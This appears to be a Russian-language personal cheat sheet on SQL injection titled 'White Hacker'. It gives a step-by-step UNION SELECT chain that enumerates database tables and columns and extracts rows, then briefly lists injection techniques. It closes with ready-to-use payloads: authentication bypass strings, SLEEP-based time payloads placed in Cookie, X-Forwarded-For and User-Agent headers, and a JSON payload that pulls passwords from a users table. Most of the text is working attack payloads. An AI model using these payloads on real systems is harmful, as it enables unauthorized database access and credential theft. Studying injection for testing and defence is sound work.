# Белый Хакер
Для идентификации SQLi можно использовать арифметику, например, id=2-1, если вывело заказ 1, то SQLI присутствует
## Техника `order by` для поиска количества колонок
`orderID=2 order by {номер колонки}`
далее юзаем UNION для определения за что отвечает каждая колонка
`orderID=-1 UNION SELECT 1,2,3,4,5,6,7,8 --`
Выбираем необходимую колонку и смотрим её название(я ща выберу 4)
`orderID=-1 UNION SELECT 1,2,3,group_concat(TABLE_NAME),5,6,7,8 FROM INFORMATION_SCHEMA.tables --`
Далее чекаем нужную табличку
`orderID=-1 UNION SELECT 1,2,3,group_concat(COLUMN_NAME),5,6,7,8 FROM INFORMATION_SCHEMA.columns WHERE table_name='secret_table' --`
Осталась только нужная строка
`orderID=-1 UNION SELECT 1,2,3,id,5,6,7,8 FROM secret_table --`
## Техники атак
1. **Stacked queries** — инъекция SQL-запросов, позволяющая злоумышленнику выполнить несколько запросов за один раз.
    
2. **Union-based** — инъекция, использующая оператор UNION для объединения результатов двух запросов, что позволяет злоумышленнику извлекать данные из других таблиц.
    
3. **Error-based** — инъекция, основанная на ошибке, которая может возникнуть при выполнении запроса, что позволяет злоумышленнику получать информацию об уязвимости.
    
4. **Boolean blind** — инъекция, при которой злоумышленник использует булевы выражения для проверки наличия или отсутствия определенных данных в базе данных.
    
5. **Time-based** — инъекция, которая использует задержку выполнения запроса для получения информации о базе данных.
    
6. **Out of band** — инъекция, которая не взаимодействует с сайтом напрямую, а использует другой канал для передачи данных, например, отправку электронной почты или HTTP-запросов.

---

# Популярные пэйлоады

### POST-параметры в формах

```SQL

' OR '1'='1' --
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
SELECT group_concat(TABLE_NAME) FROM information_schema.tables
SELECT group_concat(COLUMN_NAME) FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
" UNION SELECT null,@@version,null --

```

### HTTP-заголовки

```HTTP

Cookie: '+OR+SLEEP(5)--

X-Forwarded-For: '+OR+SLEEP(5)--

User-Agent: '+OR+SLEEP(5)--

```

### JSON/XML-запросы (API)

```JSON

"user": "admin' UNION SELECT password FROM users--"

<query>admin' OR 1=1--</query>

```

### Вторичные Параметры

```http

example.com/products?order=id ASC,(SELECT 1 FROM DUAL)

example.com/download?file=1' AND ...

```